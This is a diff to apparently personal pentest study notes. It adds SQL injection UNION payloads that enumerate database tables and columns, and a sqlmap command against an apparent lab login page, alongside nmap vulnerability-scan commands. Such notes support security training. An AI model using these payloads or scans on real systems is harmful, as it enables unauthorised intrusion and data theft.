@@ -20,10 +20,12 @@ https://www.codecademy.com/articles/sql-commands<br/>
 Cheatsheet: https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
 ' UNION select 1 from information_schema.tables # <br />
 ' UNION select 1,2 from information_schema.tables #<br />
-' UNION select 1,2,3 from information_schema.tables #
+' UNION select 1,2,3 from information_schema.tables #<br /><br /><br />
 
-' UNION select 1,table_schema,table_name from information_schema.tables #
-' UNION select 1,table_name,column_name from information_schema.columns #
+' UNION select 1,table_schema,table_name from information_schema.tables #<br />
+' UNION select 1,table_name,column_name from information_schema.columns #<br /><br />
+
+sqlmap --url http://tbfc.net/login.php --tables --columns
 ### Nmap
 Scan for vulnerabilities: nmap -Pn --script vuln 10.x.x.x
 nmap --script http-enum -p 80 xx.xx.xx.xx  <br />
